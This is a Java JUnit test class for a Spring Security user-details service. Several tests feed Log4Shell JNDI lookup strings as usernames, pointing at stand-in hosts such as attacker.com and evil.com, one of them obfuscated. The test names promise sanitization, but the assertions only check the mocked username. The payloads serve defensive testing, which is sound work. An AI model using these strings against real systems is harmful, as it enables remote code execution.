package com.contrast.frontgateservice.service;

import com.contrast.frontgateservice.entity.User;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.core.userdetails.UsernameNotFoundException;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.Mockito.when;

@ExtendWith(MockitoExtension.class)
class CustomUserDetailsServiceSecurityTest {

    @Mock
    private UserService userService;

    @InjectMocks
    private CustomUserDetailsService customUserDetailsService;

    private User testUser;

    @BeforeEach
    void setUp() {
        testUser = new User();
        testUser.setId(1L);
        testUser.setUsername("testuser");
        testUser.setPassword("encodedPassword");
        testUser.setEnabled(true);
    }

    @Test
    void testLoadUserByUsername_WithJNDIInjectionAttempt_ShouldSanitizeInput() {
        String maliciousUsername = "${jndi:ldap://exploit-server:1389/serial/CommonsCollections2}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithLog4ShellPayload_ShouldSanitizeInput() {
        String maliciousUsername = "${jndi:ldap://attacker.com/a}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithNestedJNDIPayload_ShouldSanitizeInput() {
        String maliciousUsername = "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}";
        
        when(userService.findByUsername(maliciousUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(maliciousUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
    }

    @Test
    void testLoadUserByUsername_WithNormalUsername_ShouldWork() {
        String normalUsername = "normaluser";
        
        when(userService.findByUsername(normalUsername)).thenReturn(testUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(normalUsername);

        assertNotNull(userDetails);
        assertEquals("testuser", userDetails.getUsername());
        assertEquals("encodedPassword", userDetails.getPassword());
        assertTrue(userDetails.isEnabled());
    }

    @Test
    void testLoadUserByUsername_WithNonExistentUser_ShouldThrowException() {
        String username = "nonexistent";
        
        when(userService.findByUsername(username)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(username);
        });
    }

    @Test
    void testLoadUserByUsername_WithDisabledUser_ShouldReturnDisabledUserDetails() {
        String username = "disableduser";
        User disabledUser = new User();
        disabledUser.setId(2L);
        disabledUser.setUsername("disableduser");
        disabledUser.setPassword("encodedPassword");
        disabledUser.setEnabled(false);
        
        when(userService.findByUsername(username)).thenReturn(disabledUser);

        UserDetails userDetails = customUserDetailsService.loadUserByUsername(username);

        assertNotNull(userDetails);
        assertFalse(userDetails.isEnabled());
    }

    @Test
    void testLoadUserByUsername_WithNullUsername_ShouldHandleGracefully() {
        when(userService.findByUsername(null)).thenReturn(null);

        assertThrows(UsernameNotFoundException.class, () -> {
            customUserDetailsService.loadUserByUsername(null);
        });
    }
}
